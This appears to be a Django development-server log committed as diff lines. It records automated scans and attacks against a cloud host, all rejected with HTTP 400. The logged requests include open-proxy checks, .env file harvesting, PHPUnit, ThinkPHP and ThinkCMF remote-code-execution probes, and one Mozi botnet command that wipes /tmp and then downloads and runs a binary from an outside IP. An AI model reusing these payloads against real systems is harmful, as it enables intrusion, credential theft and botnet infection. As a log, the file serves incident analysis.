+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 05:32:59] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'chek.zennolab.com'. You may need to add 'chek.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chek.zennolab.com/proxy.php
+[15/Jan/2021 05:38:07] "GET http://chek.zennolab.com/proxy.php HTTP/1.1" 400 62526
+Invalid HTTP_HOST header: 'chek.zennolab.com'. You may need to add 'chek.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /chek.zennolab.com:443
+[15/Jan/2021 05:38:32] "CONNECT chek.zennolab.com:443 HTTP/1.1" 400 61114
+[15/Jan/2021 05:39:17] code 400, message Bad request syntax ('\x04\x01\x00P%\x01ß)\x00')
+[15/Jan/2021 05:39:17] " P%ß) " 400 -
+[15/Jan/2021 05:39:43] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Jan/2021 05:39:43] " " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 05:41:24] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 05:45:09] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 05:46:49] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 05:50:27] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 05:56:33] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 06:01:40] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 06:12:00] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /.env
+[15/Jan/2021 06:12:23] "GET /.env HTTP/1.1" 400 61299
+Invalid HTTP_HOST header: 'chekfast.zennolab.com'. You may need to add 'chekfast.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chekfast.zennolab.com/proxy.php
+[15/Jan/2021 06:20:43] "GET http://chekfast.zennolab.com/proxy.php HTTP/1.1" 400 62630
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 06:21:02] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 06:25:27] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 06:27:45] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 06:29:44] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 06:35:23] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /shell
+[15/Jan/2021 06:39:18] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://219.157.147.140:52828/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 400 62587
+Invalid HTTP_HOST header: 'work.a-poster.info:25000'. You may need to add 'work.a-poster.info' to ALLOWED_HOSTS.
+Bad Request: /http:/work.a-poster.info:25000/
+[15/Jan/2021 06:42:08] "POST http://work.a-poster.info:25000/ HTTP/1.1" 400 61703
+[15/Jan/2021 06:42:11] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Jan/2021 06:42:11] " " 400 -
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /.env
+[15/Jan/2021 06:48:59] "GET /.env HTTP/1.1" 400 61345
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 06:49:00] "POST / HTTP/1.1" 400 61628
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 06:51:38] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 06:51:57] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 06:56:12] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'mastak.ga'. You may need to add 'mastak.ga' to ALLOWED_HOSTS.
+Bad Request: /http:/mastak.ga/proxy-check.php
+[15/Jan/2021 06:56:50] "POST http://mastak.ga/proxy-check.php HTTP/1.1" 400 61511
+[15/Jan/2021 06:56:55] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Jan/2021 06:56:55] " " 400 -
+[15/Jan/2021 06:57:00] code 400, message Bad request syntax ('\x04\x01\x00P\\wqx\x00')
+[15/Jan/2021 06:57:00] " P\wqx " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 07:00:54] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /.env
+[15/Jan/2021 07:02:10] "GET /.env HTTP/1.1" 400 61344
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /vendor/.env
+[15/Jan/2021 07:02:10] "GET /vendor/.env HTTP/1.1" 400 61421
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /storage/.env
+[15/Jan/2021 07:02:11] "GET /storage/.env HTTP/1.1" 400 61432
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /public/.env
+[15/Jan/2021 07:02:11] "GET /public/.env HTTP/1.1" 400 61421
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 07:04:52] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /.env
+[15/Jan/2021 07:17:55] "GET /.env HTTP/1.1" 400 61299
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /wp-content/
+[15/Jan/2021 07:17:55] "GET /wp-content/ HTTP/1.1" 400 61376
+Invalid HTTP_HOST header: 'httpbin.org'. You may need to add 'httpbin.org' to ALLOWED_HOSTS.
+Bad Request: /http:/httpbin.org/get
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /Autodiscover/Autodiscover.xml
+Bad Request: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[15/Jan/2021 07:21:11] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 400 61546
+[15/Jan/2021 07:21:11] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 61764
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /solr/admin/info/system
+[15/Jan/2021 07:21:11] "GET /solr/admin/info/system?wt=json HTTP/1.1" 400 61796
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /index.php
+[15/Jan/2021 07:21:11] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 400 62879
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 07:21:12] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 400 61730
+[15/Jan/2021 07:21:12] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 400 62130
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /wp-content/plugins/wp-file-manager/readme.txt
+[15/Jan/2021 07:21:12] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 400 61707
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /console/
+[15/Jan/2021 07:21:12] "GET /console/ HTTP/1.1" 400 61300
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /api/jsonws/invoke
+[15/Jan/2021 07:21:12] "POST /api/jsonws/invoke HTTP/1.1" 400 61413
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[15/Jan/2021 07:21:12] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 62108
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 07:22:20] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 07:22:52] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 07:35:51] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 07:40:06] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 07:41:30] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 07:49:14] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 07:50:46] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 07:51:06] "GET / HTTP/1.1" 400 61349
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 07:58:58] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 08:03:44] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 08:10:23] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 08:11:25] "GET / HTTP/1.1" 400 60923
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 08:13:02] "GET / HTTP/1.0" 400 60680
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 08:13:45] "GET / HTTP/1.1" 400 60680
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 08:20:00] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 08:24:07] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 08:29:19] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
